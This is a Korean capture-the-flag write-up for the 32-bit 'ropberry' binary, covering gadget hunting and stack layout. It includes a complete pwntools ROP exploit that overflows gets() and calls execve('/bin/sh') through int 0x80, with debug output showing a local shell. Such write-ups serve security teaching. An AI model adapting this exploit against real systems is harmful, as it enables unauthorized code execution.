# ropberry

## binary

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048f20 <+0>:	push   ebp
   0x08048f21 <+1>:	mov    ebp,esp
   0x08048f23 <+3>:	sub    esp,0x18
   0x08048f26 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048f29 <+9>:	mov    ecx,DWORD PTR [ebp+0x8]
   0x08048f2c <+12>:	mov    DWORD PTR [ebp-0x4],0x0
   0x08048f33 <+19>:	mov    DWORD PTR [ebp-0x8],ecx
   0x08048f36 <+22>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048f39 <+25>:	call   0x8048ed0 <vuln>
   0x08048f3e <+30>:	mov    eax,0x0
   0x08048f43 <+35>:	add    esp,0x18
   0x08048f46 <+38>:	pop    ebp
   0x08048f47 <+39>:	ret    
End of assembler dump.
gdb-peda$ disass vuln 
Dump of assembler code for function vuln:
   0x08048ed0 <+0>:	push   ebp
   0x08048ed1 <+1>:	mov    ebp,esp
   0x08048ed3 <+3>:	sub    esp,0x18
   0x08048ed6 <+6>:	lea    eax,ds:0x80c4f08
   0x08048edc <+12>:	mov    DWORD PTR [esp],eax
   0x08048edf <+15>:	call   0x80499c0 <printf>
   0x08048ee4 <+20>:	mov    ecx,0x0
   0x08048ee9 <+25>:	mov    DWORD PTR [esp],0x0
   0x08048ef0 <+32>:	mov    DWORD PTR [ebp-0x8],eax
   0x08048ef3 <+35>:	mov    DWORD PTR [ebp-0xc],ecx
   0x08048ef6 <+38>:	call   0x80499f0 <fflush>
   0x08048efb <+43>:	lea    ecx,[ebp-0x4]
   0x08048efe <+46>:	mov    DWORD PTR [esp],ecx
   0x08048f01 <+49>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048f04 <+52>:	call   0x8049af0 <gets>
   0x08048f09 <+57>:	mov    DWORD PTR [ebp-0x14],eax
   0x08048f0c <+60>:	add    esp,0x18
   0x08048f0f <+63>:	pop    ebp
   0x08048f10 <+64>:	ret    
End of assembler dump.
gdb-peda$
```
```bash
ubuntu@ubuntu checksec ropberry
[*] '/home/ubuntu/Desktop/~/ropberry'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit binary, NX enabled임을 확인할 수 있다. `PLT & GOT`를 찾아봤지만 확인이 안된다. 대신, 바이너리에 사용하는 함수가 모두 존재한다. 

```bash
gdb-peda$ p system
No symbol table is loaded.  Use the "file" command.
gdb-peda$ p execve
No symbol table is loaded.  Use the "file" command.
gdb-peda$ p execl
No symbol table is loaded.  Use the "file" command.
gdb-peda$ 
```

하지만 `system`이나 `execve`같은 함수는 내부에 존재하지 않는다. 쉘코드를 만들 때 자주 사용한 `int 0x80`을 이용해 `execve`를 호출해야 한다.

`execve`의 syscall 번호는 `0xb`이므로 `eax = 0xb`, `ebx = &"/bin/sh\x00"`, `ecx = &&"/bin/sh"`, `edx = NULL` 정도로 만들어 주면 된다.

또한 바이너리 내부에 `"/bin/sh"` 문자열이 없으므로 적당한 곳에 문자열을 써야한다. 또한 `"/bin/sh"`를 가리키는 주소도 저장해야 하므로 `mov [reg1], reg2` 형태의 가젯이 필요하다.

필요한 Gadget들을 나열해보면 다음과 같다.

```nasm
pop; pop; pop; ret
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
mov [reg1], reg2; ret
int 0x80; ret
```

`mov [reg1], reg2; ret`을 바이너리에서 찾았다

```bash
rp++ -f ./ropberry -r 3 | grep " ; ret" | grep "mov dword \[" | grep "ret"

0x0804b69a: mov dword [ecx], eax ; ret  ;  (1 found)
```

다른 Gadget도 rp++을 통해 찾았다.

```python
int_ret = 0x08059d70
pop_eax_ret = 0x080e2b31
pop_ebx_ret = 0x080c4730
pop_ecx_ret = 0x080e394a
pop_edx_ret = 0x0805957a
pop3ret = 0x804859c
mov_ptr_ecx_eax_ret = 0x0804b69a
```

Writable area를 다음과 같이 찾았다

```bash
gdb-peda$ shell ps
   PID TTY          TIME CMD
 58825 pts/19   00:00:03 zsh
 62859 pts/19   00:00:00 gdb
 62903 pts/19   00:00:00 ropberry
 63024 pts/19   00:00:00 ps
gdb-peda$ shell cat /proc/62903/maps
08048000-080ed000 r-xp 00000000 08:01 1580725                            /home/ubuntu/~/ropberry
080ed000-080ef000 rw-p 000a4000 08:01 1580725                            /home/ubuntu/~/ropberry
080ef000-08113000 rw-p 00000000 00:00 0                                  [heap]
f7ff9000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
gdb-peda$ 
```
```python
writable = 0x080efd90
```

`read`와 `write`도 gdb에서 찾았다

```bash
gdb-peda$ p read
$1 = {<text variable, no debug info>} 0x80580d0 <read>
gdb-peda$ p write
$2 = {<text variable, no debug info>} 0x8058140 <write>
gdb-peda$ 
```
필요한 내용은 모두 얻었다. ROP 코드를 작성해보자

```c
read(0, writable, 8);
write(1, writable,12); //메모리에 잘 들어갔는지 확인
__asm {					//writable+10 주소에 writable주소를 저장
	mov ecx, writable+0x10	
	mov eax, writable
	mov dword [ecx], eax
	ret
}
__asm {						//execve("/bin/sh", &"/bin/sh", NULL);
	mov eax,0xb
	mov ebx, writable
	mov ecx, writable + 0x10
	mov edx, 0x00
	int 0x80
}
```

스택 프래임을 작성해보면 아래와 같다

Stack | Explanation
---- | ----
read | ret <-- esp
pppr | 
0 | 
writable | 
8 | 
write | ret of read
1 |
writable |
12 | 
pop ecx; ret | ret of write
writable + 0x10 | ecx
pop eax; ret | 
writable | eax
mov [ecx], eax | 
pop eax; ret | 
0xb | eax
pop ebx; ret | 
writable | ebx
pop ecx; ret | 
writable+0x10 | ecx
pop edx; ret |
0x00 | edx
int 0x80 |

첫번째 `read()`에서 `"/bin/sh\x00"`를 `stdin`으로 입력해주면 된다. 

```python 
from pwn import *

context.log_level = 'debug'

int_ret = 0x08059d70
pop_eax_ret = 0x080e2b31
pop_ebx_ret = 0x080c4730
pop_ecx_ret = 0x080e394a
pop_edx_ret = 0x0805957a
pop3ret = 0x804859c
mov_ptr_ecx_eax_ret = 0x0804b69a

read = 0x80580d0
write = 0x8058140

writable = 0x080efd90

#execve("/bin/sh", ["/bin/sh"], 0)

payload = 'a'*4 + 'b'*4

payload += p32(read) + p32(pop3ret) + p32(0) + p32(writable) + p32(8)

payload += p32(write) + p32(pop3ret) + p32(1) + p32(writable) + p32(12)

payload += p32(pop_ecx_ret) + p32(writable+0x10) + p32(pop_eax_ret) + p32(writable)

payload += p32(mov_ptr_ecx_eax_ret)

payload += p32(pop_eax_ret) + p32(0xb) + p32(pop_ebx_ret) + p32(writable) + p32(pop_ecx_ret) + p32(writable+0x10) + p32(pop_edx_ret) + p32(0) + p32(int_ret)

with open('./payload', 'w') as fp:
    fp.write(payload)

p = process('./ropberry')
p.recvuntil('\n')
p.sendline(payload)
#gdb.attach(proc.pidof(p)[0])

p.sendline("/bin/sh\x00")
p.interactive()
```

```bash
[+] Starting local process './ropberry': pid 63216
[DEBUG] Received 0x2d bytes:
    '> Ok, now give me the name of our president.\n'
[DEBUG] Sent 0x69 bytes:
    00000000  61 61 61 61  62 62 62 62  d0 80 05 08  9c 85 04 08  │aaaa│bbbb│····│····│
    00000010  00 00 00 00  90 fd 0e 08  08 00 00 00  40 81 05 08  │····│····│····│@···│
    00000020  9c 85 04 08  01 00 00 00  90 fd 0e 08  0c 00 00 00  │····│····│····│····│
    00000030  4a 39 0e 08  a0 fd 0e 08  31 2b 0e 08  90 fd 0e 08  │J9··│····│1+··│····│
    00000040  9a b6 04 08  31 2b 0e 08  0b 00 00 00  30 47 0c 08  │····│1+··│····│0G··│
    00000050  90 fd 0e 08  4a 39 0e 08  a0 fd 0e 08  7a 95 05 08  │····│J9··│····│z···│
    00000060  00 00 00 00  70 9d 05 08  0a                        │····│p···│·│
    00000069
[DEBUG] Sent 0x9 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  0a                        │/bin│/sh·│·│
    00000009
[*] Switching to interactive mode
[DEBUG] Received 0xc bytes:
    00000000  2f 62 69 6e  2f 73 68 00  00 00 00 00               │/bin│/sh·│····││
    0000000c
/bin/sh\x00\x00\x00\x00\x00$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```